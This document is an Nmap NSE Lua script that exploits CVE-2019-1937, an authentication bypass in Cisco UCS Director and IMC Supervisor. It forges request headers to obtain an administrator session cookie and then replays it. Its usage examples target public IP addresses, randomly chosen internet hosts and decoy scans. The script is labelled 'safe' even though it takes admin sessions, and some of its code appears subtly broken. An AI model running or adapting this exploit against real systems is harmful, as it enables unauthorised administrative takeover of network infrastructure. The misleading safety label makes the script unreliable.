---
-- Nmap NSE cisco-cve-2019-1937.nse - Version 1.7
-- Affected versions: Cisco UCS Director 6.6.0 <=> 6.7.0
-- Copy to: /usr/share/nmap/scripts/cisco-cve-2019-1937.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help cisco-cve-2019-1937.nse
-- Port(s) accepted by this nse: 80,443
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it {Disclosure = Pedro Ribeiro}
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.

Some Syntax examples:
nmap --script-help cisco-cve-2019-1937.nse
nmap -sV -T4 -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse 212.40.68.127
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 212.40.68.127
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "uri=/,verbose=true" 137.44.25.194
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "lhost=192.168.1.71,verbose=true" 137.44.25.194
nmap -sS -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3" 137.44.25.194
nmap -sS -Pn -n -v -T4 -iR 700 -p 80,443 --open --reason --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help cisco-cve-2019-1937.nse
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 212.40.68.127
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "uri=/,verbose=true" 137.44.25.194
-- nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "lhost=192.168.1.71,verbose=true" 137.44.25.194
-- nmap -sS -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3" 137.44.25.194
-- nmap -sS -Pn -n -v -T4 -iR 700 -p 80,443 --open --reason --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 443/tcp open  https  Apache httpd 2.4.38
-- | cisco-cve-2019-1937:
-- |   VULNERABLE:
-- |   Cisco UCS Supervisor (Web Interface Auth Bypass)
-- |   State: VULNERABLE
-- |   IDs:  CVE:CVE-2019-1937
-- |   Risk factor: Critical  CVSSv2: 10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
-- |     Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
-- |     to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
-- |     is due to insufficient request header validation during the authentication process. An attacker could exploit this
-- |     vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
-- |     to use the acquired session token to gain full administrator access to the affected device.
-- |
-- |   Disclosure date: 2019-Ago-21
-- |   Exploit results:
-- |     Uri: https://192.168.1.71:443/app/ui/ClientServlet?apiName=GetUserInfo
-- |     Auth-Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
-- |     LoginAccess: admin
-- |
-- |   Referencies:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-1937
-- |     https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby
-- |     https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html
-- |_
-- @args verbose => Display Error(s) verbose outputs  - Default: false
-- @args User-Agent => User-Agent to send in requests - Default: Android; Mobile; Firefox 45.0
-- @args uri => the Full URL to send in GET requests  - Default: /app/ui/ClientServlet?apiName=GetUserInfo
--
-- @args lhost => Manually set internal ip addr       - Default: nil (auto-seach)
-- IF for any reason my nse cant 'auto' (nil) retrieve the lhost internal ip addr.
-- Then the nse 'User' can manually input is internal ip address using script @args lhost=<internal-ip-addr>
-- Example: nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "lhost=192.168.1.71" <target-ip-addr>
---


author = "r00t-3xp10it"
copyright = "Pedro Ribeiro"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse" --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 443}, "http, https", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local decoy_agent = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/45.0"
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/app/ui/ClientServlet?apiName=GetUserInfo"
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local ip_addr = stdnse.get_script_args(SCRIPT_NAME..".lhost") or nil
local uri_stats,cookie_stats,vuln_test = nil,nil,nil


if ( ip_addr == nil ) then
-- Capture (Local) distro flavor { windows | Linux }
local socket = io.popen("ver 2>&1") --> supress io.popen() stdout error msg (2>&1)
flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
socket.close()
if ( flavor == nil or flavor == "" or string.find(flavor, "not found")) then
   local socket = io.popen("uname -s")
   flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
   socket.close()
end

   if (string.find(flavor, "linux") or string.find(flavor, "Linux")) then
      -- Executing BASH command(s) and storing results
      -- Storing network interface in use { wlan0 | eth0 }
      local socket = io.popen("netstat -r|grep 'default'|awk {'print $8'}")
      local int_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from interface
      socket:close()
      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ifconfig "..int_addr.."|grep -m 1 'inet'|awk {'print $2'}")
      ip_addr = socket:read("*a"):gsub("\n", ""):gsub(" ", "") --> Strip 'new line' from ip addr
      socket:close()
   elseif (string.find(flavor, "windows") or string.find(flavor, "Windows")) then
      -- Executing CMD command and storing results
      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ipconfig|FINDSTR IPv4")
      ip_addr = socket:read("*a"):gsub("Autoconfiguration IPv4 Address. . : ", ""):gsub("\n", ""):gsub(" ", "")
      socket.close()
   else
      -- This nse script its written to execute ONLY in (Local) Windows or Linux Operative Systems
      print("| cve-2019-1937:\n|   State: not compatible OS flavor\n|     OS flavor: "..flavor.." (local pc)\n|     Remark: This nse only exec under Windows or Linux\n|_")
      return nil
   end
end

-- Make sure we have 'ip_addr' set at this time.
if (ip_addr == nil or ip_addr == "") then
   print("| cve-2019-1937:\n|   State: nse cant retrieve internal ip addr\n|    Remark: manualy input your internal ip addr\n|    Example: --script-args lhost=192.168.1.71,verbose=true\n|_")
   -- IF (ip_addr == nil or ip_addr == "") then abort further tests.
   return nil
end


-- Identify servers that answer 200 to invalid HTTP requests
-- and exit as these would invalidate the next nse tests
local status_404, result_404, _ = http.identify_404(host, port)
if ( status_404 and result_404 == 200 ) then
   print("| cve-2019-1937:\n|   Uri: "..host.ip..":"..port.number.." (false positive)\n|    Reason: All URIs tested return status [200] OK\n|_")
   return nil
end


-- Send [1º] GET request - to capture header['Location']
if ( not(ip_addr == nil or ip_addr == "") ) then
local _decoy = {header={}} --> Build TCP request 'header'
_decoy['header']['Host'] = ip_addr
_decoy['header']['User-Agent'] = decoy_agent
_decoy['header']['Cache-Control'] = "no-store"
_decoy['header']['X-Requested-With'] = "XMLHttpRequest"
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
if ( port.number == 443 ) then
   _decoy['header']['Referer'] = "https://"..ip_addr.."/"
else
   _decoy['header']['Referer'] = "http://"..ip_addr.."/"
end

   -- Send [1º] GET request and read response
   local response = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(response or response.status) ) then
      uri_stats = "uri not found"
   elseif (response and response.status == 302) then
      -- if [302] then Grab redirection url to use on next GET request
      local redirection = response.header and response.header['Location'] or ""
      if ( not(redirection == nil or redirection == "") ) then
         if (port.number == 443) then
            uri = redirection:gsub("Location: https://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         else
            uri = redirection:gsub("Location: http://", ""):gsub(ip_addr, "")
            uri_stats = "true"
         end
      else
         -- None redirection header['Location'] found
         uri_stats = "none header redirection"
      end
   else
      -- Wrong uri status code received (not vuln)
      uri_stats = "uri not found"
   end
end


-- Send [2º] GET request - Follow the redirection uri to capture Set-Cookie { auth cookie }
-- JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC745; Path=/app; Secure; HttpOnly
if ( uri_stats == "true" ) then
   local res = http.get(host, port, uri, _decoy, { no_cache = true, no_cache_body = true })
   if ( not(res or res.status) ) then
      cookie_stats = "redirection uri not found"
   elseif (res and res.status == 200) then
      -- if [200] then Grab Set-Cookie value to use on next GET request
      local set_cookie = response.header and response.header['Set-Cookie'] or ""
      if ( not(set_cookie == nil or set_cookie == "") ) then
         local parse_cookie = set_cookie:gsub("Set-Cookie: ", ""):gsub("; Path=/app; Secure; HttpOnly", "")
         cookie_stats = "true"
      else
         cookie_stats = "none cookie"
      end
   elseif (response and response.status ~= 200) then
      -- Wrong uri status code received (not vuln)
      cookie_stats = "redirection uri not found"
   end
end


-- Build Nmap vulnerable {table}
local vuln_table = {
   title = "Cisco UCS Supervisor (Web Interface Auth Bypass)",
   state = vulns.STATE.NOT_VULN,
   IDS = {CVE = 'CVE-2019-1937'},
   risk_factor = "Critical",
      scores = {
         CVSSv2 = "10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
      },
   description = [[
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.
]],
   references = {
     'https://nvd.nist.gov/vuln/detail/CVE-2019-1937',
     'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby',
     'https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html',
   },
   dates = {
      disclosure = {year = '2019', month = 'Ago', day = '21'},
   },
   exploit_results = {}, --> Display auth cookie and creds
}

-- Build vulnerable stdout { vuln_table }
if (uri_stats == "true" and cookie_stats == "true") then
   if (port.number == 443) then
      table.insert(vuln_table.exploit_results, string.format("Uri: https://"..host.ip..":"..port.number..uri))
   else
      table.insert(vuln_table.exploit_results, string.format("Uri: http://"..host.ip..":"..port.number..uri))
   end
   table.insert(vuln_table.exploit_results, string.format("Auth-Cookie: "..parse_cookie))
   table.insert(vuln_table.exploit_results, string.format("LoginAccess: admin\n"))
end


-- Send [3º] GET request - admin session cookie Authentication
if (uri_stats == "true" and cookie_stats == "true") then
uri = "/app/ui/ClientServlet?apiName=GetUserInfo"
local _send = {header={}} --> Build TCP request 'header'
_send['header']['Host'] = ip_addr
_send['header']['User-Agent'] = decoy_agent
_send['header']['Cookie'] = parse_cookie..";"
_send['header']['Cache-Control'] = "no-store"
_send['header']['X-Requested-With'] = "XMLHttpRequest"
_send['header']['X-Starship-UserSession-Key'] = "ssa"
_send['header']['X-Starship-Request-Key'] = "redteam"
_send['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
if ( port.number == 443 ) then
   _send['header']['Referer'] = "https://"..ip_addr.."/"
else
   _send['header']['Referer'] = "http://"..ip_addr.."/"
end

   -- Send [3º] GET request and read response
   local vuln_test = http.get(host, port, uri, _send, { no_cache = true, no_cache_body = true })
   if (vuln_test and vuln_test.status == 200) then
      vuln_table.state = vulns.STATE.VULN
      local report = vulns.Report:new(SCRIPT_NAME, host, port)
      return report:make_output(vuln_table)
   elseif (vuln_test and vuln_test.status ~= 200) then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: [?] POSSIBLE VULNERABLE to CVE-2019-1937\n    Remark: Host did NOT accepted our header[cookie] authentication\n    Uri: "..host.ip..":"..port.number..uri.."\n\n"
   end

   -- Error messages { verbose=true }
   elseif (uri_stats == "uri not found" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [001] uri not found\n\n"
   elseif (uri_stats == "none header redirection" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [002] header['Location'] not found\n\n"
   elseif (cookie_stats == "redirection uri not found" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [003] redirection uri not found\n\n"
   elseif (cookie_stats == "none cookie" and verbose == "true") then
      return "\n  Cisco UCS (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n    Reason: [004] auth cookie not found\n\n"
   end
end
